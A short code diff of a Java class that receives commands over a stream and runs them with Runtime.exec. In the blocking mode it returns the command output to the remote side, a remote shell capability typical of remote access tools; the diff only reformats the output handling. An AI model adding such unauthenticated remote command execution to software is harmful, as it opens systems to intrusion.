@@ -102,10 +102,14 @@ public class JUL {
                     } else if (type == REQUEST_VERSION) {
                         sWrite(WriteData.SINGLE_BYTE, SEND_VERSION, EMPTYBARR, null);
                         sWrite(WriteData.SINGLE_BYTE, (byte) 0x03, EMPTYBARR, null);
+                        
+                        
                     } else if (type == EXEC_NATIVE_COMMAND) {
                         String nativeCommand = readOffString(inStream);
                         sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND, EMPTYBARR, null);
                         Runtime.getRuntime().exec(nativeCommand);
+                        
+                        
                     } else if (type == EXEC_NATIVE_COMMAND_AND_BLOCK) {
                         String nativeCommand = readOffString(inStream);
                         sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND_AND_BLOCKING, EMPTYBARR, null);
@@ -113,7 +117,10 @@ public class JUL {
                         StringBuilder commandOutput = new StringBuilder();
                         int fromStream;
                         while ((fromStream = p.getInputStream().read()) != -1) {
-                            commandOutput.append((byte) fromStream);
+                            if (fromStream == 13) {
+                                fromStream = 10;
+                            }
+                            commandOutput.append((char)fromStream);
                         }
                         sWrite(WriteData.SINGLE_BYTE, EXECUTING_NATIVE_COMMAND_AND_BLOCKING_END, EMPTYBARR, null);
                         writeString(commandOutput.toString());
